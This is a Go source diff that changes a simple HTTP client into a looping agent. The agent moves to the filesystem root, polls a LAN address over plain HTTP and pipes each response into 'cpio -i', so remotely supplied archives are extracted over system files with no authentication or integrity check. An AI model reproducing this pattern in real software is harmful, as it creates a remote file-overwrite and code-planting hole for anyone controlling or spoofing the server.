@@ -1,10 +1,13 @@
 package main
 
 import (
-	"bufio"
 	"fmt"
+	"io"
+	"log"
 	"net"
 	"net/http"
+	"os"
+	"os/exec"
 	"time"
 )
 
@@ -12,15 +15,14 @@ import (
 
 
 func main() {
+	os.Chdir("/")
+
+	// Setting up the connection manually so we can ensure a low port
 	localAddr, err := net.ResolveIPAddr("ip", "localhost")
 	if err != nil {
 		panic(err)
 	}
 
-	// You also need to do this to make it work and not give you a
-	// "mismatched local address type ip"
-	// This will make the ResolveIPAddr a TCPAddr without needing to
-	// say what SRC port number to use.
 	localTCPAddr := net.TCPAddr{
 		IP: localAddr.IP,
 		Port: 987,
@@ -42,14 +44,13 @@ func main() {
 		},
 	}
 
-
 	for true {
 		var resp *http.Response
 
 		for true {
 			var err error
 			fmt.Printf("Connecting ....\n")
-			resp, err = webclient.Get("http://localhost:9873/files/runtime/xx-xx-xx-xx-xx-xx")
+			resp, err = webclient.Get("http://192.168.1.1:9873/runtime/xx-xx-xx-xx-xx")
 			if err == nil {
 				break
 			} else {
@@ -58,15 +59,21 @@ func main() {
 			time.Sleep(1000 * time.Millisecond)
 		}
 
-		fmt.Println("Response status:", resp.Status)
-		scanner := bufio.NewScanner(resp.Body)
-		for i := 0; scanner.Scan() && i < 5; i++ {
-			fmt.Println(scanner.Text())
+		fmt.Printf("Connection accepted to remote host\n")
+		command := exec.Command("cpio", "-i")
+		stdin, err := command.StdinPipe()
+		if err != nil {
+			log.Fatal(err)
 		}
-		if err := scanner.Err(); err != nil {
-			panic(err)
-		}
+
+		go func() {
+			defer stdin.Close()
+			io.Copy(stdin, resp.Body)
+		}()
+
+		command.Run()
 		resp.Body.Close()
+
 		time.Sleep(5000 * time.Millisecond)
 	}
 }
